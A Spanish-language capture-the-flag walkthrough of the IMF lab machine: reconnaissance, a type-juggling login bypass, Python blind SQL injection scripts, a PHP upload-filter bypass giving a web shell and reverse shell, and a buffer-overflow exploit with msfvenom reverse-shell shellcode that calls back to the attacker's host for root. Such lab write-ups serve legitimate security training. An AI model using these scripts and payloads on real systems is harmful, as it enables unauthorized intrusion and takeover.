-----------

**IP:** 192.168.1.74
**SO:** Linux Ubuntu
**Vulns:** [[Ataque de Type Juggling]], [[SQLI]], [[Abuso de subida de archivos]]

------------------------------------------

Vamos a comenzar con un escaneo en red con el objetivo de identificar la maquina victima y esto con ayuda de [[Arp-Scan]]:
```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20250827203002.png]]

Podemos observar que que ya tenemos la IP de la maquina victima que será la `192.168.1.74` 

Ya con esto vamos a realizar un escaneo general con ayuda de [[Nmap]] con el objetivo de comenzar a detectar puertos abiertos:
```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.74 -oG allPorts
```

![[Pasted image 20250827203348.png]]

Podemos observar que la maquina solo cuenta con el puerto `80` abierto por lo que vamos a comenzar con un escaneo mucho mas exhaustivo:
```bash
nmap -p80 -sCV 192.168.1.74 -oN target
```

![[Pasted image 20250827203947.png]]

nos nos brinda mucha información a mas de que por la versión del http que nos filtra que es un sistema ubuntu.

Vamos a la web a ver que encontramos:
![[Pasted image 20250827204049.png]]

En el apartado de contactos nos encontramos con:
![[Pasted image 20250827204128.png]]
esto nos da correos electrónicos, toda la información es buena por lo que vamos a almacenarlos:
- `rmichaels@imf.local`
- `akeith@imf.local`
- `estone@imf.local`

En realidad no encontramos mucho mas por lo que mi primera idea luego de ver esto es realizar fuzzing a la web a ver si descubro algo:
```bash
gobuster dir -u http://192.168.1.74 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

![[Pasted image 20250827204922.png]]
del escaneo llaman la atención dos directorios, uno es el de  `less` y el otro el de `server-status` pero revisándolos y haciendo fuzzing en realidad no logramos encontrar nada, en cambio revisando un poco la web como es el código html podemos ver lo siguiente:
![[Pasted image 20250827205328.png]]
el doble igual del ultimo script y los nombres de los otros 2 tienen mucha similitud a base64 por lo que con ayuda de **curl** vamos a crear una petición y para practicar un poco filtraremos por eso y lo uniremos quedando el siguiente comando:
```bash
curl -s -X GET "http://192.168.1.74" | grep -oP 'js/\K[^.]+' | tail -n 3 | xargs | sed 's/ //g' | base64 -d;echo
```

![[Pasted image 20250827205851.png]]
Podemos ver que obtenemos la flag, en este caso lo que vamos a hacer es pasar ese texto de base64 a normal que esta entre las llaves:
```bash
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d ;echo
```

![[Pasted image 20250827210009.png]]
lo primero que se me viene a la mente al ver eso es una ruta en la web ya que no tenemos nada mas detectado aun en la maquina por lo que vamos a ver si es posible:

![[Pasted image 20250827210106.png]]
Observamos que si forma parte de la maquina y que es un panel de Login por lo que vamos a ver la forma de hacer bypass.

![[Pasted image 20250827210411.png]]
como vemos en la imagen capturamos la petición y la enviamos al repeater para analizarla un poco y podemos observar que nos da un mensaje en el cual nos dice que SQL no esta funcional pero que el Login sigue funcionando, esto ya nos dice que no tenemos lo que es **SQLI** por lo tanto vamos a ver si encontramos otro método:

![[Pasted image 20250827211709.png]]

podemos observar que hicimos uso de los datos encontrados antes y estos nos permitieron empleando un [[Ataque de Type Juggling]] para hacer bypass al login, esto podemos llevarlo a la web para poder verlo mejor.
![[Pasted image 20250827212015.png]]

podemos observar una nueva flag la cual contiene algo en base64 por lo que vamos a intentar ver su contenido:
![[Pasted image 20250827212119.png]]

nos dice que continuemos con el `cms` por lo tanto vamos a hacerlo.

![[Pasted image 20250827212731.png]]
vemos esta web la cual vemos que mediante el parámetro `pagename` carga recursos, podemos ver si se puede implementar alguna inyección SQL:

![[Pasted image 20250827213232.png]]
![[Pasted image 20250827213209.png]]
al parecer la web es vulnerable a [[SQLI]] y por como vamos probando cuando la query es correcta vemos el `Welcome to the IMF Administration` lo que sugiere que es de tipo booleana a siegas por lo que vamos a ver si podemos enumerarla con un script en python3:

Listando las bases de datos:
```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal,string

# Global var
main_url="http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie={"PHPSESSID":"ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

#CTRl_C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status(payload)

            if "Welcome to the IMF Administration." in r.text:
                data+=character
                p2.status(data)
                break

def main():
    sqlInyection()


if __name__ == '__main__':
    main()

```

![[Pasted image 20250827215841.png]]
Como podemos ver logramos listar las bases de datos y son: `information_schema,admin,mysql,performance_schema,sys`.
En mi caso la que me llama la atención es la de `admin` por lo que vamos a ver que contiene:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal,string

# Global var
main_url="http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie={"PHPSESSID":"ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

#CTRl_C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(table_name) from information_schema.tables where table_schema='admin'),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status("")

            if "Welcome to the IMF Administration." in r.text:
                data+=character
                p2.status(data)
                break

def main():
    sqlInyection()


if __name__ == '__main__':
    main()
```

![[Pasted image 20250827220142.png]]
Vemos que nos lista una tabla pages, veamos su contenido:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal,string

# Global var
main_url="http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie={"PHPSESSID":"ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

#CTRl_C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(column_name) from information_schema.columns where table_schema='admin' and table_name='pages'),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status("")

            if "Welcome to the IMF Administration." in r.text:
                data+=character
                p2.status(data)
                break

def main():
    sqlInyection()


if __name__ == '__main__':
    main()
```

![[Pasted image 20250827220338.png]]
Podemos observar como tenemos `id,pagename,pagedata` vemos que tenemos en `pagename`:
```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal,string

# Global var
main_url="http://192.168.1.74/imfadministrator/cms.php?pagename=home"
cookie={"PHPSESSID":"ni2l0bfeou0ppfnvb8on8pavf6"}
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",_"

#CTRl_C
def def_handler(sing, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def sqlInyection():

    data = ""

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("Data")

    for position in range(1, 100):
        for character in characters:
            payload = main_url + "' and substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

            r = requests.get(payload, cookies=cookie)
            p1.status("")

            if "Welcome to the IMF Administration." in r.text:
                data+=character
                p2.status(data)
                break

def main():
    sqlInyection()


if __name__ == '__main__':
    main()
```

![[Pasted image 20250827220928.png]]
Podemos observar algunas de las sub páginas que tenemos en la web pero otras no por lo que vamos a ver que encontramos, además tenemos una en especifico que llaman mi atención que es `tutorials-incomplete`:

![[Pasted image 20250827221010.png]]
Podemos observar que tenemos un código QR por lo que podemos escanearlo a ver que es:

![[Pasted image 20250827221100.png]]
Es otra flag, veamos que nos indica esta flag:
![[Pasted image 20250827221228.png]]
vemos que esta flag nos da una especie de ruta, miremos que es lo que contiene:

![[Pasted image 20250827221319.png]]
Acabamos de encontrar una web que nos permite subir archivos que al parecer es cualquier tipo de archivo por lo que vamos aprobar con alguno a ver que tenemos.

![[Pasted image 20250827221611.png]]
Se trato de subir un archivo php por lo que supongo la web debe tener algún tipo de restricción para un solo tipo de archivo.

Lo que se puede hacer en este caso es capturar la subida de archivo con BurpSuite y ver como se esta tramitando la petición para intentar burlarla he intentar un [[Abuso de subida de archivos]]:

![[Pasted image 20250828081734.png]]
Ya capturamos el como se esta enviando el archivo y vamos a intentar diferentes métodos esperando que alguno nos permita pasar la subida de archivos.

Hemos encontrado la forma de Eludirlo y es realizando un poco de ingenio, tenemos que saber que muchas veces cuando hablamos de archivos php nosotros podemos ciertas cadenas representarlas en hexadecimal y estas van a ser interpretadas de igual forma por lo que tomando esto en cuenta y conociendo que el web detecta el uso de la palabra`syste` dentro del archivo vamos a pasar `system` a hexadecimal de la siguiente manera:
```bash
 echo "system" | xxd
```

![[Pasted image 20250828082636.png]]
En si lo que nos sirve es lo que esta en el recuadro rojo, y el como se tiene que representar es de la siguiente manera: `\x73\x79\x73\x74\x65\x6d` y en nuestra petición de BurpSuite quedaría de la siguiente manera:

![[Pasted image 20250828082831.png]]
Como podemos ver estamos combinando algunos métodos también para la subida como son: cambio de extensión, modificación del content type, alteramos la cabecera del contenido para que mediante los Magic Numbers no se detecte el  verdadero tipo de archivo y por ultimo el cambio de `system` a hexadecimal, si enviamos esto veremos logramos subir el archivo:
![[Pasted image 20250828083031.png]]
Bueno revisando un poco la respuesta nos percatamos de algo interesante:
![[Pasted image 20250828083240.png]]
Como podemos ver tenemos como un identificador, puede que este sea el nombre con el que se almacena el archivo y recordando que anteriormente encontramos la ruta de `uploads/` en el sistema podemos intentar ver si logramos que el archivo se interprete.

algo de lo que nos percatamos luego es que entra en conflicto los Magic Numbers y la extension de archivo por lo que vamos a corregirlo quedando de la siguiente manera:
![[Pasted image 20250828083820.png]]
El content type no afecta pero en el caso de los Magic Number y la extensión si por lo que debemos hacerlo coincidir.
Ahora si usamos el valor que nos da en la respuesta dentro de `uploads` veremos lo siguiente:
![[Pasted image 20250828083921.png]]

Podemos observar que el código php se esta interpretando y ya podemos ejecutar comando, tomando esto en cuenta vamos a modificar nuestro archivo para que nos permite mediante un parámetro ejecutar los comandos:

![[Pasted image 20250828092605.png]]
perfecto ahora vemos si logramos ejecutar comandos:

![[Pasted image 20250828092710.png]]
perfecto, en este punto vamos a entablarnos una reverse shell para obtener control de la maquina:

![[Pasted image 20250828093032.png]]
![[Pasted image 20250828093043.png]]

ya tenemos todo listo vamos a entablar la conexión:

![[Pasted image 20250828093105.png]]
ya estamos conectados, en este punto se realizará el tratamiento  de la tty y comenzaremos con escaneo general del sistema para ver si logramos encontrar alguna forma de escalar privilegios.

Podemos observar que encontramos otra flag:
![[Pasted image 20250828093628.png]]

vamos a ver cual es su contenido:
![[Pasted image 20250828093724.png]]
Nos dice `agentservices`, esto me hace pensar en algún servicio con nombre agent por lo que podemos intentar buscar en la maquina algún binario con nombre `agent`:
```bash
find / -name agent 2>/dev/null
```

![[Pasted image 20250828093937.png]]
vemos dos servicios lo que llama la atención y mas en el caso de que tenemos un binario por lo que a ese lo analizaremos primero:

![[Pasted image 20250828094328.png]]
vemos que es un binario compilado de 32bit para Linux.

![[Pasted image 20250828094121.png]]

Ahora vemos el otro archivo:
![[Pasted image 20250828094453.png]]

podemos observar que solo tenemos permiso de lectura para otros y dueño es root, leyendo un poco vemos que es un servicio que parece estar corriendo por el puerto `7788` podemos analizarlo:

```bash
netstat -nat
```

![[Pasted image 20250828094830.png]]
Como vemos si esta algo en el puerto 7788 por lo que podemos intentar ver primero si el servicio esta corriendo:
```bash
ps -aux | grep agent
```

![[Pasted image 20250828095025.png]]
Como vemos ese no es el servicio ya que el usuario es `www-data` y el comando es el de `grep agent` nosotros buscamos uno que sea propietario `root`.

Algo que podemos intentar es conectarnos al servicio y dejarlo en segundo plano para ver si este se levanta cuando se establece la conexión:
```bash
nc localhost 7788 &>/dev/null &
```

y luego revisar de nuevo los procesos:
```bash
ps -aux | grep agent
```

![[Pasted image 20250828095503.png]]

vemos que el servicio entra en ejecución como root por lo que en efecto se ejecuta como root. a demás el binario no tiene nada extraño como permisos SUID o Capabilities, pero claro al correr el servicio, entonces al generar la conexión y levantarse ese servicio se corre como root. podemos ahora si ver que nos pide este binario al conectarnos:

![[Pasted image 20250828095846.png]]
vemos que nos pide un `Agent ID` el cual no tenemos pero podemos intentar listar las cadenas legibles del binario para ver que encontramos:
```bash
strings /usr/local/bin/agent
```

leyendo por todo lo que nos da no encontramos nada que nos sea util por lo que vamos a intentar traer el binario a nuestra maquina y analizarlo con ayuda de [[Ghidra]].

Primero nos traemos el binario a nuestra maquina:
```bash
# desde la maquina atacante hacemos:
nc -nlvp 444 > agent
# desde la maquina victima:
nc 192.168.1.108 444 < /usr/local/bin/agent 
```

![[Pasted image 20250828102459.png]]
vemos que ya tenemos el archivo.

En este punto vamos a [[Ghidra]] para analizar el archivo:
![[Pasted image 20250828103018.png]]

como podemos ver ya tenemos listo el binario para analizar y dentro de la función main para ver como es que funciona.

Leyendo el código y comprendiendo al igual que cambiando el nombre de una que otra variable vemos como me quedo el código y a la conclusión que se llego:
![[Pasted image 20250828103646.png]]
Vamos a explicar esto, en la parte `1` vemos como con `fgets` estamos almacenando el input cuando al ejecutar nos pide el Agent ID en el programa, luego en la parte `2` vemos como usamos ese input que introducimos para realizar una comparación con la variable `local_28` la cual esta arriba en la parte `3` pero si leemos mas detenidamente podemos ver que en la parte `4`  con ayua de `asprintf` estamos almacenado contenido en esa variable, exactamente esa cadena en hexadecimal.
Ahora [[Ghidra]] tiene una opción que nos permite con click derecho pasar esa cadena de hexadecimal a decimal donde ya podemos ver cual es el Agent ID valido para continuar:
![[Pasted image 20250828104048.png]]

entonces ya tenemos el valor y es `48093572`.
![[Pasted image 20250828104151.png]]
Como podemos observar que con esto ya logramos avanzar en el programa.

Ahora se continua analizando el programa por alguna falla y en una de la opción del menú, específicamente en la `3` tenemos que podemos subir un report pero en el código veamos como lo hace:
![[Pasted image 20250828105227.png]]

vemos que estamos leyendo el input con `gets` y almacenando en la variable `local_a8` la cual tiene un buffer al comienzo asignado de `164`.
Algo que tenemos que saber es que la función `gets` no valida el tamaño del buffer por lo que es vulnerable y esto puede acontecer un Buffer Overflow.

Esto podemos intentarlo ingresando mucho texto en la opción 3:
![[Pasted image 20250828105640.png]]Observemos que se rompe la memoria por lo cual ya podemos comenzar a buscar la forma de explotar este Buffer Overflow.

Para comenzar con el análisis en mi caso mi arch no esta configurado para que se puedan hacer pruebas de Buffer Overflow pero vamos a usar un docker con Kali para hacerlo.

ya con esto vamos a comenzar ejecutando con `gdb` el binario: 
```bash
gdb ./agent -q
```

![[Pasted image 20250828110849.png]]

Vamos a correr el programa y hacer que se suceda el Buffer Overflow:
![[Pasted image 20250828111053.png]]

Una vez que demos enter veremos lo siguiente:
![[Pasted image 20250828111137.png]]

podemos ver que estamos sobre escribiendo el `EIP` el cual es el encargado contener la dirección de memoria de la siguiente instrucción o proceso a ejecutar.
Entonces nuestro objetivo es primero ver cuantos caracteres tenemos que usar para lograr sobre escribir el `EIP` de forma exacta de la siguiente manera:

1. Creamos una carga util con 200 caracteres, que es lo que se uso para romper el programa y sobre escribir el `EIP`:
```bash
pattern create 200
```

![[Pasted image 20250828111949.png]]

vamos ahora a introducir la cadena que nos dio gef:
![[Pasted image 20250828112101.png]]

podemos observar que ahora ya la cadena es otra, en este caso con una utilidad de gef de nuevo que nos permite saver la cantidad de caracteres antes de sobre escribir el `EIP`:
```bash
pattern offset
```

![[Pasted image 20250828112318.png]]

vemos que nos dice que necesitamos un total de `168` caracteres antes de sobre escribir el `EIP` por lo que vamos con python a armar una carga de `168` A y luego `4` B para ver si es cierto, lo que tendríamos que ver son 4 B en el `EIP`:

```bash
python3 -c "print('A'*168 + 'B'*4)"
```
![[Pasted image 20250828112659.png]]

usaremos eso y vemos que obtenemos:
![[Pasted image 20250828112753.png]]
vemos que si es valido.

Ahora revisemos las protecciones que tiene el binario:
![[Pasted image 20250828112841.png]]
Vemos que tiene todas las protecciones deshabilitadas por lo que tranquilamente vamos a poder entrar a la pila `ESP` ingresar un shell Code en algún punto y este se ejecutaría.

Ahora en la maquina vemos si tenemos el `ASLR (**Address Space Layout Randomization**)` habilitado:
```bash
cat /proc/sys/kernel/randomize_va_space 
```

![[Pasted image 20250828113221.png]]

Vemos que si se encuentra activado y si queremos ver si en verdad esta funcionando podemos ejecutar el agent con `ldd` de forma multiple y ver el contenido de `libc`:
```bash
for i in $(seq 1 20);do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()';done
```
![[Pasted image 20250828113611.png]]]
Vemos como la memoria esta cambiando multiples veces pero en el caso de `32bit` las memorias al ser pequeñas podemos llegar a ver repeticiones luego de varias repeticiones:
```bash
for i in $(seq 1 10000);do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()';done | grep "0xf7634000"
```
![[Pasted image 20250828113851.png]]
Esto seria valido pero vamos a realizar otro tipo de Buffer Overflow donde usaremos la técnica `ret2reg` donde lo primero que vamos a ver es por ejemplo donde están nuestras `A` :
```bash
x/100wx $esp
```

![[Pasted image 20250828114832.png]]
vemos que no están por aquí por lo que vamos a listar un poco para mas hacia atrás a ver si logramos ver algo:
```bash
x/100wx $esp-200
```

![[Pasted image 20250828115008.png]]

Podemos observar que si se encuentra mas atrás por lo que vamos a ver mejor otros registros como lo es el `eax` :
![[Pasted image 20250828115134.png]]

```bash
x/16wx $eax
```
![[Pasted image 20250828115244.png]]
Perfecto encontramos algunas `A` pero vamos a ver si encontramos el comienzo de estas así que listemos un poco para atrás:

```bash
x/16wx $eax-8
```
![[Pasted image 20250828115345.png]]

Prefecto ya tenemos el inicio por lo que vamos a crear con [[msfvenom]] vamos a crear el shell Code:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.108 LPORT=448 -b '\x00\x0a\0xd' -f c
```
![[Pasted image 20250828115725.png]]

Ya tenemos el shell Code por lo que ahora vamos a crear un script en python3 de la siguiente manera:
vamos por partes:

Primero lo que hacemos es guardar nuestro shell code en formato bytes y luego tenemos que tener claro el concepto de que nuestra sobre escritura se aplica cuando sobrepasamos los 168 caracteres lo  lo que nuestro `offset=168` luego nuestro shell doce tiene un total de 92 bytes, lo que nosotros tenemos que completar el `offset` y para esto a nuestro `payload` igual a la suma del `shellcode -> 92bytes` y vamos a rellenar el resto con `A` donde el numero de `A` que faltan es el total menos el Shell Code.
```python
#!/usr/bin/python3

from struct import pack

shellcode=(b"\xbf\x74\x48\x87\x1f\xdd\xc6\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x0e\x46\x65\xea\xdf"
b"\x8d\x9e\xf6\x4c\x71\x32\x93\x70\xfc\x55\xd3\x12\x33\x15"
b"\x87\x83\x7b\x29\x65\xb3\x35\x2f\x8c\xdb\x05\x67\x6f\x77"
b"\xee\x7a\x70\x86\x2e\xf3\x91\x38\xc8\x54\x03\x6b\xa6\x56"
b"\x2a\x6a\x05\xd8\x7e\x04\xf8\xf6\x0d\xbc\x6c\x26\xdd\x5e"
b"\x04\xb1\xc2\xcc\x85\x48\xe5\x40\x22\x86\x66")

offset = 168 # es el total de valores para sobre escribir el EIP y necesitamos llegar a ese valor
payload = shellcode + b"A" * (offset - len(shellcode))

```

Ahora nosotros tenemos que definir la memoria a la que apuntara el `EIP` que representara la `eax` pero recordando que la memoria es dinámica no tendría mucho sentido, pero tenemos que tomar en cuenta que podemos buscar las direcciones contenidas en el propio binario las cuales si son estáticas, para esto nos ayudaremos de una herramienta de metasploit para obtener el código de como se llama una función `call eax`:
```bash
/opt/metasploit/tools/exploit/nasm_shell.rb
```

![[Pasted image 20250828121255.png]]

![[Pasted image 20250828121421.png]]

Vemos que es `FFD0` por lo que ahora vamos a buscar de la siguiente manera esto en el binario:
```bash
objdump -d agent | grep -i "FF D0"
```
![[Pasted image 20250828121713.png]]
Podemos observar que si tenemos en el binario un `call eax` por lo que esta memoria al ser estática no va a cambiar.

con esto ya tendríamos todo lo necesario tomando en cuenta que nuestro objetivo será que el `ISP` apunte a este espacio de memoria y como nuestro Shell Code ya estará allí este se va a ejecutar.
Por lo tanto vamos a agregar lo que le falta a nuestro script en python:
```python
#!/usr/bin/python3

from struct import pack

shellcode=(b"\xbf\x74\x48\x87\x1f\xdd\xc6\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x0e\x46\x65\xea\xdf"
b"\x8d\x9e\xf6\x4c\x71\x32\x93\x70\xfc\x55\xd3\x12\x33\x15"
b"\x87\x83\x7b\x29\x65\xb3\x35\x2f\x8c\xdb\x05\x67\x6f\x77"
b"\xee\x7a\x70\x86\x2e\xf3\x91\x38\xc8\x54\x03\x6b\xa6\x56"
b"\x2a\x6a\x05\xd8\x7e\x04\xf8\xf6\x0d\xbc\x6c\x26\xdd\x5e"
b"\x04\xb1\xc2\xcc\x85\x48\xe5\x40\x22\x86\x66")

offset = 168 # es el total de valores para sobre escribir el EIP y necesitamos llegar a ese valor

#❯ objdump -d agent | grep -i "FF D0"
# 8048563:	ff d0                	call   *%eax

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x8048563) # el pack es para representar la memoria en little-endian
```

esto ya es funcional pero la idea no es ejecutarlo nosotros sino que el usuario root lo haga y este lo hace solo cuando se genera la conexión por el puerto `7788` por lo que vamos pasar nuestro script a la maquina victima y lo completaremos de la siguiente manera para realizar la conexión en este caso mediante sockets:
```python
#!/usr/bin/python3

from struct import pack
import socket

shellcode=(b"\xbf\x74\x48\x87\x1f\xdd\xc6\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x0e\x46\x65\xea\xdf"
b"\x8d\x9e\xf6\x4c\x71\x32\x93\x70\xfc\x55\xd3\x12\x33\x15"
b"\x87\x83\x7b\x29\x65\xb3\x35\x2f\x8c\xdb\x05\x67\x6f\x77"
b"\xee\x7a\x70\x86\x2e\xf3\x91\x38\xc8\x54\x03\x6b\xa6\x56"
b"\x2a\x6a\x05\xd8\x7e\x04\xf8\xf6\x0d\xbc\x6c\x26\xdd\x5e"
b"\x04\xb1\xc2\xcc\x85\x48\xe5\x40\x22\x86\x66")

offset = 168 # es el total de valores para sobre escribir el EIP y necesitamos llegar a ese valor

# ^   objdump -d agent | grep -i "FF D0"
# 8048563:      ff d0                   call   *%eax

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x8048563) + b"\n" # el pack es para representar la memoria en little-endian, el salto de linea en bytes tambien
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))
s.recv(1024) # recivismo la respuesta

s.send(b"48093572\n") # madamos el Agent ID todo en bytes
s.recv(1024) # recivismo la respuesta

s.send(b"3\n") # Mandamos la opcion3 todo en bytes
s.recv(1024) # recivismo la respuesta

s.send(payload) # Mandamos el payload y esperamos que el shell Code se ejecute
```

Ahora ya con esto vamos a dejar el puerto `448` en escucha que es el que se configuro con [[msfvenom]] y veamos si funciona:
![[Pasted image 20250828123723.png]]

lo logramos ya estamos como root, realicemos el tratamiento de la bash y veamos si encontramos la ultima flag:
![[Pasted image 20250828123900.png]]
Maquina terminal  :) 